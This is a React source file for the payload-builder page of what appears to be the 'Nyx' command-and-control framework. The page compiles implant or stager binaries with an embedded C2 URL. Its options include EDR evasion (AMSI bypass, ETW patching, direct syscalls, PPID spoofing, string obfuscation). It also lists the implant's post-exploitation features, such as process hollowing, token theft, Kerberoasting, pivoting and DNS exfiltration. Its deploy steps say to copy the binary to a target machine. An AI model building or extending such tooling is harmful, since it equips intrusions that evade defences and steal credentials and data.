import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Download, Package, CheckCircle, AlertCircle, Loader, Shield, Calendar, Layers } from "lucide-react";
import { api } from "../api/client";

const PLATFORMS = [
  { id: "linux-amd64",   label: "Linux",   sub: "x86_64",       icon: "🐧" },
  { id: "linux-arm64",   label: "Linux",   sub: "ARM64",         icon: "🐧" },
  { id: "darwin-amd64",  label: "macOS",   sub: "Intel",         icon: "🍎" },
  { id: "darwin-arm64",  label: "macOS",   sub: "Apple Silicon", icon: "🍎" },
  { id: "windows-amd64", label: "Windows", sub: "x86_64",        icon: "🪟" },
];

const JITTER_MODES = [
  { id: "linear",     label: "Linear",      desc: "Uniform random variance" },
  { id: "gaussian",   label: "Gaussian",    desc: "Normal distribution — natural looking" },
  { id: "sinusoidal", label: "Sinusoidal",  desc: "Slow sine wave — avoids uniform intervals" },
  { id: "burst",      label: "Burst",       desc: "3 fast then 1 long — evades pattern detection" },
];

type BuildState = "idle" | "building" | "done" | "error";
interface Profile { name: string; description: string; }

function Toggle({ value, onChange, label, desc }: { value: boolean; onChange: () => void; label: string; desc: string }) {
  return (
    <div className="flex items-center gap-3 p-3"
      style={{ background: "#050505", border: "1px solid var(--border)" }}>
      <motion.button onClick={onChange} whileTap={{ scale: 0.95 }}
        className="relative flex-shrink-0"
        style={{ width: 34, height: 18, border: `1px solid ${value ? "var(--accent)" : "var(--text-faint)"}`,
          background: value ? "rgba(0,255,65,0.08)" : "transparent", borderRadius: 1 }}>
        <motion.div animate={{ x: value ? 16 : 2 }} transition={{ type: "spring", stiffness: 500, damping: 30 }}
          style={{ position: "absolute", top: 2, width: 12, height: 12,
            background: value ? "var(--accent)" : "var(--text-faint)",
            boxShadow: value ? "0 0 4px var(--accent)" : "none" }} />
      </motion.button>
      <div>
        <p className="text-xs font-semibold" style={{ fontFamily: "'JetBrains Mono', monospace", color: value ? "var(--text)" : "var(--text-faint)" }}>
          {label}
        </p>
        <p className="text-xs mt-0.5" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>{desc}</p>
      </div>
    </div>
  );
}

const Divider = ({ label }: { label: string }) => (
  <div className="flex items-center gap-3 py-1">
    <div style={{ flex: 1, height: 1, background: "var(--border)" }} />
    <span className="text-xs tracking-widest uppercase" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
      // {label}
    </span>
    <div style={{ flex: 1, height: 1, background: "var(--border)" }} />
  </div>
);

export default function Builder() {
  const [c2url, setC2url]         = useState("http://127.0.0.1:8000");
  const [platform, setPlatform]   = useState("linux-amd64");
  const [sleep, setSleep]         = useState(5);
  const [jitter, setJitter]       = useState(1);
  const [jitterMode, setJitterMode] = useState("linear");
  const [state, setState]         = useState<BuildState>("idle");
  const [error, setError]         = useState("");
  const [filename, setFilename]   = useState("");
  const [obfuscate, setObfuscate] = useState(false);
  const [profile, setProfile]     = useState("default");
  const [profiles, setProfiles]   = useState<Profile[]>([]);
  const [killDate, setKillDate]   = useState("");
  const [buildStager, setBuildStager] = useState(false);
  const [enableAmsi, setEnableAmsi]   = useState(false);
  const [enableEtw, setEnableEtw]     = useState(false);
  const [enablePpid, setEnablePpid]   = useState(false);
  const [ppidTarget, setPpidTarget]   = useState("explorer.exe");
  const [enableSleepMask, setEnableSleepMask] = useState(false);
  const [enableSyscalls, setEnableSyscalls]   = useState(false);

  useEffect(() => {
    api.get<Profile[]>("/api/profiles/").then(r => setProfiles(r.data)).catch(() => {});
  }, []);

  const build = async () => {
    setState("building"); setError("");
    try {
      const token = localStorage.getItem("nyx_token");
      const res = await fetch("http://localhost:8000/api/builder/build", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          c2_url: c2url, platform, sleep, jitter,
          obfuscate, profile, kill_date: killDate,
          jitter_mode: jitterMode, build_stager: buildStager,
          enable_amsi: enableAmsi, enable_etw: enableEtw,
          enable_ppid: enablePpid, ppid_target: ppidTarget,
          enable_sleep_mask: enableSleepMask, enable_syscalls: enableSyscalls,
        }),
      });
      if (!res.ok) { const err = await res.json(); throw new Error(err.detail ?? "Build failed"); }
      const blob = await res.blob();
      const ext  = platform.startsWith("windows") ? ".exe" : "";
      const name = buildStager ? `nyx-stager-${platform}${ext}` : `nyx-agent-${platform}${ext}`;
      setFilename(name);
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url; a.download = name; a.click();
      URL.revokeObjectURL(url);
      setState("done");
      setTimeout(() => setState("idle"), 4000);
    } catch (e: unknown) {
      setError((e as Error).message);
      setState("error");
    }
  };

  const inputStyle = {
    background: "var(--bg)", border: "1px solid var(--border)",
    color: "var(--text)", fontFamily: "'JetBrains Mono', monospace",
    fontSize: "12px", padding: "8px 12px", outline: "none",
  };

  return (
    <div className="p-6 space-y-5" style={{ minHeight: "100%", background: "var(--bg)" }}>
      <motion.div initial={{ opacity: 0, y: -8 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.25 }}>
        <h1 className="text-lg font-bold tracking-widest uppercase"
          style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)", textShadow: "0 0 10px rgba(0,255,65,0.5)" }}>
          // PAYLOAD_BUILDER
        </h1>
        <p className="text-xs mt-1" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
          compile a custom agent with embedded C2 URL
        </p>
      </motion.div>

      <div className="grid grid-cols-3 gap-5">
        {/* Left: config */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
          className="col-span-2 hud-panel p-5 space-y-5">

          {/* C2 URL */}
          <div>
            <label className="block text-xs mb-2 tracking-widest uppercase"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              C2_SERVER_URL
            </label>
            <input value={c2url} onChange={e => setC2url(e.target.value)}
              style={{ ...inputStyle, width: "100%" }} placeholder="https://your-server.com" />
            <p className="text-xs mt-1" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              Agent beacons back to this URL
            </p>
          </div>

          {/* Platform */}
          <div>
            <label className="block text-xs mb-3 tracking-widest uppercase"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              TARGET_PLATFORM
            </label>
            <div className="grid grid-cols-5 gap-2">
              {PLATFORMS.map(p => {
                const active = platform === p.id;
                return (
                  <motion.button key={p.id} onClick={() => setPlatform(p.id)}
                    whileTap={{ scale: 0.97 }}
                    className="flex flex-col items-center gap-1 py-3 px-1"
                    style={{
                      background: active ? "rgba(0,255,65,0.05)" : "transparent",
                      border: `1px solid ${active ? "rgba(0,255,65,0.3)" : "var(--border)"}`,
                      borderLeft: active ? "2px solid var(--accent)" : "1px solid var(--border)",
                      cursor: "pointer",
                    }}>
                    <span className="text-base">{p.icon}</span>
                    <span className="text-xs font-semibold"
                      style={{ fontFamily: "'JetBrains Mono', monospace", color: active ? "var(--accent)" : "var(--text-faint)" }}>
                      {p.label}
                    </span>
                    <span style={{ fontSize: "9px", fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>{p.sub}</span>
                  </motion.button>
                );
              })}
            </div>
          </div>

          {/* Sleep / Jitter */}
          <div className="grid grid-cols-2 gap-4">
            {[
              { label: "SLEEP_SECS", val: sleep, setter: setSleep, min: 1, max: 3600 },
              { label: "JITTER_SECS", val: jitter, setter: setJitter, min: 0, max: 60 },
            ].map(({ label, val, setter, min, max }) => (
              <div key={label}>
                <label className="block text-xs mb-2 tracking-widest"
                  style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                  {label}
                </label>
                <input type="number" value={val} onChange={e => setter(+e.target.value)}
                  min={min} max={max} style={{ ...inputStyle, width: "100%" }} />
              </div>
            ))}
          </div>

          {/* Jitter Mode */}
          <div>
            <label className="block text-xs mb-2 tracking-widest uppercase"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              JITTER_MODE
            </label>
            <div className="grid grid-cols-4 gap-2">
              {JITTER_MODES.map(m => {
                const active = jitterMode === m.id;
                return (
                  <motion.button key={m.id} onClick={() => setJitterMode(m.id)} whileTap={{ scale: 0.97 }}
                    className="flex flex-col gap-1 p-2.5 text-left"
                    style={{
                      background: active ? "rgba(0,255,65,0.04)" : "transparent",
                      border: `1px solid ${active ? "rgba(0,255,65,0.25)" : "var(--border)"}`,
                      cursor: "pointer",
                    }}>
                    <span className="text-xs font-semibold"
                      style={{ fontFamily: "'JetBrains Mono', monospace", color: active ? "var(--accent)" : "var(--text-faint)" }}>
                      {m.label}
                    </span>
                    <span style={{ fontSize: "9px", fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)", lineHeight: "1.3" }}>
                      {m.desc}
                    </span>
                  </motion.button>
                );
              })}
            </div>
          </div>

          {/* C2 Profile */}
          <div>
            <label className="block text-xs mb-2 tracking-widest uppercase"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              <span className="flex items-center gap-1.5"><Layers size={11} /> C2_TRAFFIC_PROFILE</span>
            </label>
            <select value={profile} onChange={e => setProfile(e.target.value)}
              style={{ ...inputStyle, width: "100%", cursor: "pointer" }}>
              {profiles.map(p => <option key={p.name} value={p.name}>{p.name} — {p.description}</option>)}
            </select>
            <p className="text-xs mt-1" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              Shapes HTTP traffic to mimic a legitimate service
            </p>
          </div>

          {/* Kill Date */}
          <div>
            <label className="block text-xs mb-2 tracking-widest uppercase"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              <span className="flex items-center gap-1.5"><Calendar size={11} /> KILL_DATE (optional)</span>
            </label>
            <input type="date" value={killDate} onChange={e => setKillDate(e.target.value)}
              style={{ ...inputStyle, width: "100%", colorScheme: "dark" }} />
            <p className="text-xs mt-1" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              Agent self-terminates after this date
            </p>
          </div>

          {/* Payload options */}
          <div className="space-y-2">
            <Toggle value={obfuscate} onChange={() => setObfuscate(v => !v)}
              label="XOR String Obfuscation"
              desc="Hides C2 URL from static analysis — unique XOR key per build" />
            <Toggle value={buildStager} onChange={() => setBuildStager(v => !v)}
              label="Build Stager Instead"
              desc="Minimal first-stage loader — downloads full agent from C2 on execution" />
          </div>

          {/* EDR Evasion */}
          <div>
            <Divider label="EDR EVASION · WINDOWS" />
            <div className="space-y-2 mt-3">
              <Toggle value={enableAmsi} onChange={() => setEnableAmsi(v => !v)}
                label="AMSI Bypass" desc="Patches AmsiScanBuffer on startup — PowerShell/script scanning disabled" />
              <Toggle value={enableEtw} onChange={() => setEnableEtw(v => !v)}
                label="ETW Patching" desc="Patches EtwEventWrite — blinds EDR telemetry channel" />
              <Toggle value={enableSleepMask} onChange={() => setEnableSleepMask(v => !v)}
                label="Sleep Masking" desc="XOR-encrypts sensitive strings in memory while agent sleeps" />
              <Toggle value={enableSyscalls} onChange={() => setEnableSyscalls(v => !v)}
                label="Hell's Gate (Direct Syscalls)" desc="Resolves NT syscall numbers from ntdll — bypasses EDR API hooks" />
              <Toggle value={enablePpid} onChange={() => setEnablePpid(v => !v)}
                label="PPID Spoofing" desc="Spawned processes appear as children of a trusted parent process" />
              <AnimatePresence>
                {enablePpid && (
                  <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: "auto" }}
                    exit={{ opacity: 0, height: 0 }} className="pl-11 overflow-hidden">
                    <label className="block text-xs mb-1.5"
                      style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                      Parent process name
                    </label>
                    <input value={ppidTarget} onChange={e => setPpidTarget(e.target.value)}
                      style={{ ...inputStyle, width: "100%" }} placeholder="explorer.exe" />
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          </div>

          {/* Post-Exploitation capabilities */}
          <div>
            <Divider label="POST-EXPLOITATION · v0.8.0" />
            <div className="mt-3 p-3 space-y-2" style={{ background: "#050505", border: "1px solid var(--border)" }}>
              <p className="text-xs mb-2" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                Capabilities compiled into this agent:
              </p>
              {[
                ["Process Hollowing",   "hollow / hollow-pe — inject shellcode or PE into a suspended process"],
                ["Token Impersonation", "token-steal/make/revert/spawn — steal or forge Windows access tokens"],
                ["BOF / COFF Loader",   "bof — execute Beacon Object Files in-process (CS-compatible)"],
                ["Reflective DLL",      "refdll — map a DLL from memory without touching disk"],
                ["Kerberoasting",       "kerb-roast <SPN> — extract TGS hash for offline cracking"],
                ["AS-REP Roasting",     "asrep-roast <user> <domain> <dc> — extract AS-REP hash"],
              ].map(([name, desc]) => (
                <div key={name} className="flex items-start gap-2">
                  <span style={{ color: "var(--accent)", fontSize: "10px", marginTop: 3 }}>▸</span>
                  <div>
                    <span className="text-xs font-semibold" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text)" }}>
                      {name}
                    </span>
                    <span className="text-xs" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                      {" "}— {desc}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* P2P & Pivot */}
          <div>
            <Divider label="P2P & PIVOT · v0.9.0" />
            <div className="mt-3 p-3 space-y-2" style={{ background: "#050505", border: "1px solid var(--border)" }}>
              <p className="text-xs mb-2" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                Pivot infrastructure — all platforms unless noted:
              </p>
              {[
                ["SOCKS5 Proxy",       "socks5-start <port> [user pass] — in-agent proxy, route tools via proxychains"],
                ["Port Forward",       "pfwd-start <local> <remote:port> — tunnel internal services to operator"],
                ["SMB Named Pipe C2",  "(Windows) smb-pipe-listen / smb-pipe-connect — chain agents over LAN"],
                ["DNS Beacon",         "dns-beacon-start <domain> — fallback C2 via TXT record polling"],
                ["DNS Data Exfil",     "results chunked into DNS label queries → server reassembles"],
              ].map(([name, desc]) => (
                <div key={name} className="flex items-start gap-2">
                  <span style={{ color: "#00CC33", fontSize: "10px", marginTop: 3 }}>▸</span>
                  <div>
                    <span className="text-xs font-semibold" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text)" }}>
                      {name}
                    </span>
                    <span className="text-xs" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                      {" "}— {desc}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Build button */}
          <motion.button onClick={build} disabled={state === "building"}
            whileTap={{ scale: 0.98 }}
            className="btn-primary w-full py-3 flex items-center justify-center gap-2">
            {state === "building"
              ? <><motion.span animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: "linear" }}>
                  <Loader size={14} /></motion.span> BUILDING…
                </>
              : <><Package size={14} /> {buildStager ? "BUILD_STAGER" : "BUILD_AGENT"}</>
            }
          </motion.button>
        </motion.div>

        {/* Right panel */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.18 }}
          className="space-y-4">
          <AnimatePresence>
            {state === "done" && (
              <motion.div initial={{ opacity: 0, y: -8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                className="p-4 flex items-start gap-3"
                style={{ background: "rgba(0,255,65,0.05)", border: "1px solid rgba(0,255,65,0.25)" }}>
                <CheckCircle size={14} style={{ color: "var(--accent)", flexShrink: 0, marginTop: 1 }} />
                <div>
                  <div className="text-xs font-bold" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
                    BUILD_SUCCESS
                  </div>
                  <div className="text-xs mt-0.5" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                    {filename}
                  </div>
                </div>
              </motion.div>
            )}
            {state === "error" && (
              <motion.div initial={{ opacity: 0, y: -8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                className="p-4 flex items-start gap-3"
                style={{ background: "rgba(255,51,51,0.05)", border: "1px solid rgba(255,51,51,0.25)" }}>
                <AlertCircle size={14} style={{ color: "var(--red)", flexShrink: 0, marginTop: 1 }} />
                <div>
                  <div className="text-xs font-bold" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--red)" }}>
                    BUILD_FAILED
                  </div>
                  <div className="text-xs mt-0.5" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                    {error}
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Deploy guide */}
          <div className="hud-panel p-4 space-y-3">
            <div className="text-xs font-bold tracking-widest flex items-center gap-1.5"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
              <Download size={11} /> // DEPLOY
            </div>
            <div className="space-y-2">
              {[
                ["01", "Configure and click Build"],
                ["02", "Copy binary to target machine"],
                ["03", "Run with appropriate permissions"],
                ["04", "Agent appears in the Agents tab"],
              ].map(([step, desc]) => (
                <div key={step} className="flex gap-3">
                  <span className="text-xs font-bold flex-shrink-0 pt-0.5 w-7"
                    style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
                    {step}
                  </span>
                  <span className="text-xs" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                    {desc}
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* Build summary */}
          <div className="hud-panel p-4 space-y-0.5">
            <div className="text-xs font-bold tracking-widest mb-3 flex items-center gap-1.5"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
              <Shield size={11} /> // BUILD_SUMMARY
            </div>
            {[
              ["Platform",    PLATFORMS.find(p => p.id === platform)?.label + " " + PLATFORMS.find(p => p.id === platform)?.sub],
              ["Profile",     profile],
              ["Jitter Mode", jitterMode],
              ["Sleep",       `${sleep}s ± ${jitter}s`],
              ["Kill Date",   killDate || "None"],
              ["Obfuscate",   obfuscate ? "XOR (per-build key)" : "No"],
              ["Type",        buildStager ? "Stager" : "Full Agent"],
              ["AMSI Bypass", enableAmsi ? "✓" : "—"],
              ["ETW Patch",   enableEtw ? "✓" : "—"],
              ["Sleep Mask",  enableSleepMask ? "✓" : "—"],
              ["Syscalls",    enableSyscalls ? "Hell's Gate" : "—"],
              ["PPID Spoof",  enablePpid ? ppidTarget : "—"],
            ].map(([k, v]) => (
              <div key={k} className="flex justify-between items-center py-1.5"
                style={{ borderBottom: "1px solid #0A0A0A" }}>
                <span className="text-xs" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>{k}</span>
                <span className="text-xs truncate max-w-32"
                  style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>{v}</span>
              </div>
            ))}
          </div>
        </motion.div>
      </div>
    </div>
  );
}
